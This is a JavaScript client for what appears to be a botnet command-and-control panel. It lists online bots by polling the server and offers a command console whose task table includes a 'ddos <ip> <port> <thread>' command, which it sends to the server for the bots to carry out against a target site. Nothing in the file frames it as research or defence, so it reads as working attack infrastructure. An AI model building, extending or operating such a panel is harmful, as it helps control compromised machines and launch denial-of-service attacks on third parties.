"use strict";

var rested = false;
var indexer = null;
var lastCmdEnter = null;
var isLastCmdSet = false;
var cmdProcessing = false;
var fetchBotsPaused = true;
var inputHistoryCMD = [];

var tasks = { 
    "stop": { "id": 0, "help": "Stop current task", "usage": "\t\tstop" },
    "status": { "id": 1, "help": "Task status", "usage": "\t\t\tstatus" },
    "ddos": { "id": 2, "help": "Ddos a site", "usage": "\t\t\t\tddos <ip> <port> <thread>" }
}

$(document).ready(function() {
    onlineBotsSource();
    setInterval(fetchBots, 10 * 1000);
});

function onlineBotsSource() {
    $.ajax({
        type: "POST",
        url: "/online_bots_source"
    }).done(function(data) {
        let display = document.getElementById("display");
        let html = data["resp"];
        if(html) {
            fetchBotsPaused = false;
            display.innerHTML = html;
            fetchBots();      
        }
    });
}

function fetchBots() {
    if(fetchBotsPaused) {
        return;
    }
    $.ajax({
        type: "POST",
        url: "/fetch_bots"
    }).done(function(data) {
        let displayArea = document.getElementById("display-area");
        let display = document.getElementById("display");
        let amount = document.getElementById("amount");
        let status = display.getElementsByTagName("span")[3];

        let html = data["resp"];
        if(html) {
            displayArea.innerHTML = html;                  
            amount.innerHTML = data["amount"];

            if(data["status"]) {
                if(status.classList.contains("status-off")) {
                    status.classList.remove("status-off");
                }
                
                status.innerHTML = "ON";
                status.classList.add("status-on");

            } else {
                if(status.classList.contains("status-on")) {
                    status.classList.remove("status-on");
                }
                
                status.innerHTML = "OFF";
                status.classList.add("status-off");
            }

        }
    });
}

// Tasks

function taskConsoleSource() {
    $.ajax({
        type: "POST",
        url: "/task_console_source"
    }).done(function(data) {
        let display = document.getElementById("display");
        let html = data["resp"];
        if(html) {
            rested = false;
            fetchBotsPaused = true;
            let html = data["resp"];
            let display = document.getElementById("display");
            display.innerHTML = html;   
            
            indexer = inputHistoryCMD.length;
            document.getElementById("console").addEventListener("keyup", function(e) {
                if(e.which == 13) {
                    if(!rested) {
                        resetValues();
                        rested = true;
                    }
                    consoleExecute();           
                } else if(e.which == 38) {
                    if(!isLastCmdSet) {
                        isLastCmdSet = true;
                        lastCmdEnter = document.getElementById("console").value;
                    }
                    upArrow("console", inputHistoryCMD);
                } else if(e.which == 40) {
                    if(!isLastCmdSet) {
                        isLastCmdSet = true;
                        lastCmdEnter = document.getElementById("console").value;
                    }
                    downArrow("console", inputHistoryCMD);
                } else {
                    if(getBeforeLastValue("console") == lastCmdEnter) {
                        isLastCmdSet = false;
                    }
                }
            });            
        }
    });
}

function resetValues() {
    indexer = null;
    lastCmdEnter = null;
    isLastCmdSet = false;
    cmdProcessing = false;
}

function getBeforeLastValue(id) {
    let e = document.getElementById(id);
    let value = "";

    for(let n=0; n<e.value.length-1; n++) {
        value += e.value[n];
    }
    return value;
}

function upArrow(input_id, inputHistory) {
    let input = document.getElementById(input_id);
    if(inputHistory.length && indexer > 0) {
        indexer -= 1;
        input.value = inputHistory[indexer];
    } else if (inputHistory.length) {
        if(typeof input.selectionStart == "number") {
            input.selectionStart = input.selectionEnd = input.value.length;
        } else if (typeof input.createTextRange != "undefined") {
            input.focus();
            var range = input.createTextRange();
            range.collapse(false);
            range.select();
        } 
    }
}

function downArrow(input_id, inputHistory) {
    let input = document.getElementById(input_id);
    if(inputHistory.length && indexer < inputHistory.length-1) {
        indexer += 1;
        input.value = inputHistory[indexer];
    } else if(inputHistory.length && indexer == inputHistory.length-1) {
        indexer = inputHistory.length;
        input.value = lastCmdEnter;
    }
}

function getArgs(cmd) {
    let args = [];
    for(let n=1; n<cmd.length; n++) {
        args[n-1] = cmd[n];
    }
    return args;
}

function consoleExecute() {
    let input = document.getElementById("console");
    let display = document.getElementById("cmd-line");
    let cmd = input.value.trim();

    if(cmdProcessing) {
        return;
    }

    if(cmd.length) {

        input.value = "";
        let cmdOutput = "";
        cmdProcessing = true;
        isLastCmdSet = false;
        let cmdLine = "$> " + cmd;
        let currentDisplay = display.innerText;         
        let cls = (cmd == "cls" || cmd == "clear") ? true : false;

        if((inputHistoryCMD.includes(cmd))) {
           inputHistoryCMD.splice(inputHistoryCMD.indexOf(cmd), 1);  
        } 

        inputHistoryCMD[inputHistoryCMD.length] = cmd;
        indexer = inputHistoryCMD.length;

        if(cls) {
            cmdProcessing = false;
            display.innerHTML = "";
        } else if(cmd == "help") {
            cmdOutput = "cls - clear screen\nclear - clear screen\n" + "help - display help menu\n" + 
                        "tasks - display tasks"                    

            let newDisplay = currentDisplay + "\n" + cmdLine + "\n" + cmdOutput + "\n";

            cmdProcessing = false;
            display.innerText = newDisplay;
            display.scrollTop = display.scrollHeight;
        } else if(cmd == "tasks") {
            let displayed = false;
            let cmdOutput = "";

            for(let cmd in tasks) {
                if(!displayed) {
                    displayed = true;
                    cmdOutput += "\t#--------[ Available Tasks ]--------#\n\n";
                    cmdOutput += "\t[Task]\t\t[Help]" + "\t".repeat(6) + "[Usage]\n\n";
                }
                let task = tasks[cmd];
                cmdOutput += "\t" + cmd + "\t".repeat(cmd.length < 8 ? 2:1) 
                          + task["help"] + "\t".repeat(task["usage"].length < 15 ? 2:1) + task["usage"] + "\n";
            }

            let newDisplay = currentDisplay + "\n" + cmdLine + "\n" + cmdOutput + "\n";
            
            cmdProcessing = false;
            display.innerText = newDisplay;
            display.scrollTop = display.scrollHeight;

        } else {
            if(!(cmd.split(" ")[0] in tasks)) {
                let cmdOutput = "";
                let newDisplay = currentDisplay + "\n" + cmdLine + "\n" + cmdOutput + "\n";

                cmdProcessing = false;
                display.innerText = newDisplay;
                display.scrollTop = display.scrollHeight;
                return;
            }

            let loading = document.getElementById("console-load");
            loading.style.display = "block";
            input.style.display = "none";

            let _cmd = cmd.split(" ");
            let cmd_id = tasks[_cmd[0]]['id'];
            let args = _cmd.length > 1 ? getArgs(_cmd) : [-1];

            $.ajax({
                type: "POST",
                url: "/task_console_cmd",
                data: { "cmd_id": cmd_id, "args": args }
            }).done(function(data) {
                let cmdOutput = '\n' + data["resp"];
                let newDisplay = currentDisplay + "\n" + cmdLine + "\n" + cmdOutput;

                display.innerText = newDisplay + "\n";
                display.scrollTop = display.scrollHeight;               

                loading.style.display = "none";
                input.style.display = "block";
                cmdProcessing = false;
                input.focus();
            });
        }
    }        
}
